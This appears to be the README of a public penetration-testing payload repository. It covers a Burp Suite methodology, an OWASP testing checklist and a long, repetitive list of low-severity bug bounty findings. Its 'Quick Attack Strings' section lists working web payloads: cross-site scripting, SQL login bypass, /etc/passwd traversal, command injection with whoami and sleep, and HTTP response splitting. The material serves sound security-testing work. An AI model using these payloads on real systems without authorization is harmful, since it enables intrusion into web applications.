![alt tag](https://github.com/1N3/IntruderPayloads/blob/master/BurpsuiteIntruderPayloads.png)

# IntruderPayloads
A collection of Burpsuite Intruder payloads and fuzz lists and pentesting methodology. To pull down all 3rd party repos, run install.sh in the same directory of the IntruderPayloads folder.

Any comments or feedback/changes/improvements are welcome!

Author: 1N3@CrowdShield https://crowdshield.com

## LICENSE:
This software is free to distribute, modify and use with the condition that credit is provided to the creator (1N3@CrowdShield) and is not for commercial use.

## DONATIONS:
Donations are welcome. This will help fascilitate improved features, frequent updates and better overall support.
- [x] BTC 1Fav36btfmdrYpCAR65XjKHhxuJJwFyKum
- [x] DASH XoWYdMDGb7UZmzuLviQYtUGb5MNXSkqvXG
- [x] ETH 0x20bB09273702eaBDFbEE9809473Fd04b969a794d
- [x] LTC LQ6mPewec3xeLBYMdRP4yzeta6b9urqs2f


## PENTEST METHODOLOGY v2.0



### BASIC PASSIVE AND ACTIVE CHECKS:
-----------------------------------------------------------------------

- Burpsuite Spider with intelligent form submission
- Manual crawl of website through Burpsuite proxy and submitting INJECTX payloads for tracking
- Burpsuite passive scan
- Burpsuite engagement tools > Search > ```<form|<input|url=|path=|load=|INJECTX|Found|<!--|Exception|Query|ORA|SQL|error|Location|crowdshield|xerosecurity|username|password|document\.|location\.|eval\(|exec\(|\?wsdl|\.wsdl```
- Burpsuite engagement tools > Find comments
- Burpsuite engagement tools > Find scripts
- Burpsuite engagement tools > Find references
- Burpsuite engagement tools > Analyze target
- Burpsuite engagement tools > Discover content
- Burpsuite Intruder > file/directory brute force
- Burpsuite Intruder > HTTP methods, user agents, etc.
- Enumerate all software technologies, HTTP methods, and potential attack vectors
- Understand the function of the site, what types of data is stored or valuable and what sorts of functions to attack, etc.






### ENUMERATION:
-----------------------------------------------------------------------

- OPERATING SYSTEM 
- WEB SERVER
- DATABASE SERVERS
- PROGRAMMING LANGUAGES
- PLUGINS/VERSIONS
- OPEN PORTS
- USERNAMES
- SERVICES
- WEB SPIDERING
- GOOGLE HACKING


### VECTORS:
-----------------------------------------------------------------------

- INPUT FORMS
- GET/POST PARAMS
- URI/REST STRUCTURE
- COOKIES
- HEADERS



### SEARCH STRINGS:
-----------------------------------------------------------------------
Just some helpful regex terms to search for passively using Burpsuite or any other web proxy... 
```
fname|phone|id|org_name|name|email
```




### QUICK ATTACK STRINGS:
-----------------------------------------------------------------------
Not a complete list by any means, but when you're manually testing and walking through sites and need a quick copy/paste, this can come in handy... 
```
Company
First Last
username
username@mailinator.com
Password123$
+1416312384
google.com
https://google.com
//google.com
.google.com
https://google.com/.injectx/rfi_vuln.txt
https://google.com/.injectx/rfi_vuln.txt?`whoami`
https://google.com/.injectx/rfi_vuln.txt%00.png
https://google.com/.injectx/rfi_vuln.txt%00.html
12188
01/01/1979
4242424242424242
INJECTX
'>"></INJECTX>(1)
javascript:alert(1)//
"><img/onload=alert(1)>' -- 
"></textarea><img/onload=alert(1)>' -- 
INJECTX'>"><img/src="https://google.com/.injectx/xss_vuln.png"></img>
'>"><iframe/onload=alert(1)></iframe>
INJECTX'>"><ScRiPt>confirm(1)<ScRiPt>
"></textarea><img/onload=alert(1)>' -- // INJECTX <!-- 
"><img/onload=alert(1)>' -- // INJECTX <!-- 
INJECTX'"><h1>X<!-- 
INJECTX"><h1>X
en%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A
%0AContent-Length%3A%200%0A%0AHTTP%2F1.1%20200%20OK%0AContent-Type%3A%20text%2Fhtml%0AContent-Length%3A%2020%0A%3Chtml%3EINJECTX%3C%2Fhtml%3E%0A%0A
../../../../../../../../../../../etc/passwd%00
{{4+4}}
sleep 5; sleep 5 || sleep 5 | sleep 5 & sleep 5 && sleep 5
admin" or "1"="1"-- 
admin' or '1'='1'-- 
INJECTX%0a%0d%00
```




### OWASP TESTING CHECKLIST:
-----------------------------------------------------------------------
- Spiders, Robots and Crawlers	IG-001
- Search Engine Discovery/Reconnaissance	IG-002
- Identify application entry points	IG-003
- Testing for Web Application Fingerprint	IG-004
- Application Discovery	IG-005
- Analysis of Error Codes	IG-006
- SSL/TLS Testing (SSL Version, Algorithms, Key length, Digital Cert. Validity) - SSL Weakness	CM‐001
- DB Listener Testing - DB Listener weak	CM‐002
- Infrastructure Configuration Management Testing - Infrastructure Configuration management weakness	CM‐003
- Application Configuration Management Testing - Application Configuration management weakness	CM‐004
- Testing for File Extensions Handling - File extensions handling	CM‐005
- Old, backup and unreferenced files - Old, backup and unreferenced files	CM‐006
- Infrastructure and Application Admin Interfaces - Access to Admin interfaces	CM‐007
- Testing for HTTP Methods and XST - HTTP Methods enabled, XST permitted, HTTP Verb	CM‐008
- Credentials transport over an encrypted channel - Credentials transport over an encrypted channel	AT-001
- Testing for user enumeration - User enumeration	AT-002
- Testing for Guessable (Dictionary) User Account - Guessable user account	AT-003
- Brute Force Testing - Credentials Brute forcing	AT-004
- Testing for bypassing authentication schema - Bypassing authentication schema	AT-005
- Testing for vulnerable remember password and pwd reset - Vulnerable remember password, weak pwd reset	AT-006
- Testing for Logout and Browser Cache Management - - Logout function not properly implemented, browser cache weakness	AT-007
- Testing for CAPTCHA - Weak Captcha implementation	AT-008
- Testing Multiple Factors Authentication - Weak Multiple Factors Authentication	AT-009
- Testing for Race Conditions - Race Conditions vulnerability	AT-010
- Testing for Session Management Schema - Bypassing Session Management Schema, Weak Session Token	SM-001
- Testing for Cookies attributes - Cookies are set not ‘HTTP Only’, ‘Secure’, and no time validity	SM-002
- Testing for Session Fixation - Session Fixation	SM-003
- Testing for Exposed Session Variables - Exposed sensitive session variables	SM-004
- Testing for CSRF - CSRF	SM-005
- Testing for Path Traversal - Path Traversal	AZ-001
- Testing for bypassing authorization schema - Bypassing authorization schema	AZ-002
- Testing for Privilege Escalation - Privilege Escalation	AZ-003
- Testing for Business Logic - Bypassable business logic	BL-001
- Testing for Reflected Cross Site Scripting - Reflected XSS	DV-001
- Testing for Stored Cross Site Scripting - Stored XSS	DV-002
- Testing for DOM based Cross Site Scripting - DOM XSS	DV-003
- Testing for Cross Site Flashing - Cross Site Flashing	DV-004
- SQL Injection - SQL Injection	DV-005
- LDAP Injection - LDAP Injection	DV-006
- ORM Injection - ORM Injection	DV-007
- XML Injection - XML Injection	DV-008
- SSI Injection - SSI Injection	DV-009
- XPath Injection - XPath Injection	DV-010
- IMAP/SMTP Injection - IMAP/SMTP Injection	DV-011
- Code Injection - Code Injection	DV-012
- OS Commanding - OS Commanding	DV-013
- Buffer overflow - Buffer overflow	DV-014
- Incubated vulnerability - Incubated vulnerability	DV-015
- Testing for HTTP Splitting/Smuggling - HTTP Splitting, Smuggling	DV-016
- Testing for SQL Wildcard Attacks - SQL Wildcard vulnerability	DS-001
- Locking Customer Accounts - Locking Customer Accounts	DS-002
- Testing for DoS Buffer Overflows - Buffer Overflows	DS-003
- User Specified Object Allocation - User Specified Object Allocation	DS-004
- User Input as a Loop Counter - User Input as a Loop Counter	DS-005
- Writing User Provided Data to Disk - Writing User Provided Data to Disk	DS-006
- Failure to Release Resources - Failure to Release Resources	DS-007
- Storing too Much Data in Session - Storing too Much Data in Session	DS-008
- WS Information Gathering - N.A.	WS-001
- Testing WSDL - WSDL Weakness	WS-002
- XML Structural Testing - Weak XML Structure	WS-003
- XML content-level Testing - XML content-level	WS-004
- HTTP GET parameters/REST Testing - WS HTTP GET parameters/REST	WS-005
- Naughty SOAP attachments - WS Naughty SOAP attachments	WS-006
- Replay Testing - WS Replay Testing	WS-007
- AJAX Vulnerabilities - N.A.	AJ-001
- AJAX Testing - AJAX weakness	AJ-002




### LOW SEVERITY:
-----------------------------------------------------------------------
A list of low severity findings that are likely out of scope for most bug bounty programs but still helpful to reference for normal web penetration tests. 
- Descriptive error messages (e.g. Stack Traces, application or server errors).
- HTTP 404 codes/pages or other HTTP non-200 codes/pages.
- Banner disclosure on common/public services.
- Disclosure of known public files or directories, (e.g. robots.txt).
- Click-Jacking and issues only exploitable through click-jacking.
- CSRF on forms which are available to anonymous users (e.g. the contact form).
- Logout Cross-Site Request Forgery (logout CSRF).
- Presence of application or web browser ‘autocomplete’ or ‘save password’ functionality.
- Lack of Secure and HTTPOnly cookie flags.
- Lack of Security Speedbump when leaving the site.
- Weak Captcha / Captcha Bypass
- Username enumeration via Login Page error message
- Username enumeration via Forgot Password error message
- Login or Forgot Password page brute force and account lockout not enforced.
- OPTIONS / TRACE HTTP method enabled
- SSL Attacks such as BEAST, BREACH, Renegotiation attack
- SSL Forward secrecy not enabled
- SSL Insecure cipher suites
- The Anti-MIME-Sniffing header X-Content-Type-Options
- Missing HTTP security headers
- Security best practices without accompanying Proof-of-Concept exploitation
- Descriptive error messages (e.g. Stack Traces, application or server errors).
- HTTP 404 codes/pages or other HTTP non-200 codes/pages.
- Denial of Service Attacks.
- Fingerprinting / banner disclosure on common/public services.
- Disclosure of known public files or directories, (e.g. robots.txt).
- Clickjacking and issues only exploitable through clickjacking.
- CSRF on non-sensitive forms.
- Logout Cross-Site Request Forgery (logout CSRF).
- Presence of application or web browser ‘autocomplete’ or ‘save password’ functionality.
- Lack of Secure/HTTPOnly flags on non-sensitive Cookies.
- Lack of Security Speedbump when leaving the site.
- Weak Captcha / Captcha Bypass
- Login or Forgot Password page brute force and account lockout not enforced.
- OPTIONS HTTP method enabled
- HTTPS Mixed Content Scripts
- Known vulnerable libraries 
- Attacks on Third Party Ad Services
- Username / email enumeration via Forgot Password or Login page
- Missing HTTP security headers
- Strict-Transport-Security Not Enabled For HTTPS
- X-Frame-Options
- X-XSS-Protection
- X-Content-Type-Options
- Content-Security-Policy, X-Content-Security-Policy, X-WebKit-CSP
- Content-Security-Policy-Report-Only
- SSL Issues, e.g.
- SSL Attacks such as BEAST, BREACH, Renegotiation attack
- SSL Forward secrecy not enabled
- SSL weak / insecure cipher suites
- Lack of SPF records (Email Spoofing)
- Auto-complete enabled on password fields
- HTTP enabled
- Session ID or Login Sent Over HTTP
- Insecure Cookies
- Cross-Domain.xml Allows All Domains
- HTML5 Allowed Domains
- Cross Origin Policy
- Content Sniffing Not Disabled
- Password Reset Account Enumeration
- HTML Form Abuse (Denial of Service)
- Weak HSTS Age (86,000 or less)
- Lack of Password Security Policy (Brute Forcable Passwords)
- Physical Testing
- Denial of service attacks
- Resource Exhaustion attacks
- Issues related to rate limiting
- Login or Forgot Password page brute force and account lockout not enforced
- api*.netflix.com listens on port 80
- Cross-domain access policy scoped to *.netflix.com
- Username / Email Enumeration
- via Login Page error message
- via Forgot Password error message
- via Registration
- Weak password
- Weak Captcha / Captcha bypass
- Lack of Secure/HTTPOnly flags on cookies
- Cookie valid after logout
- Cookie valid after password reset
- Cookie expiration
- Forgot password autologin
- Autologin token reuse
- Same Site Scripting
- SSL Issues, e.g.
- SSL Attacks such as BEAST, BREACH, Renegotiation attack
- SSL Forward secrecy not enabled
- SSL weak / insecure cipher suites
- SSL vulnerabilities related to configuration or version
- Descriptive error messages (e.g. Stack Traces, application or server errors).
- HTTP 404 codes/pages or other HTTP non-200 codes/pages.
- Fingerprinting/banner disclosure on common/public services.
- Disclosure of known public files or directories, (e.g. robots.txt).
- Clickjacking and issues only exploitable through clickjacking.
- CSRF on forms that are available to anonymous users (e.g. the contact form).
- Logout Cross-Site Request Forgery (logout CSRF).
- Missing CSRF protection on non-sensitive functionality
- Presence of application or web browser ‘autocomplete’ or ‘save password’ functionality.
- Incorrect Charset
- HTML Autocomplete
- OPTIONS HTTP method enabled
- TRACE HTTP method enabled
- Missing HTTP security headers, specifically
- (https://www.owasp.org/index.php/List_of_useful_HTTP_headers), e.g.
- Strict-Transport-Security
- X-Frame-Options
- X-XSS-Protection
- X-Content-Type-Options
- Content-Security-Policy, X-Content-Security-Policy, X-WebKit-CSP
- Content-Security-Policy-Report-Only
- Issues only present in old browsers/old plugins/end-of-life software browsers
- IE < 9
- Chrome < 40
- Firefox < 35
- Safari < 7
- Opera < 13
- Vulnerability reports related to the reported version numbers of web servers, services, or frameworks

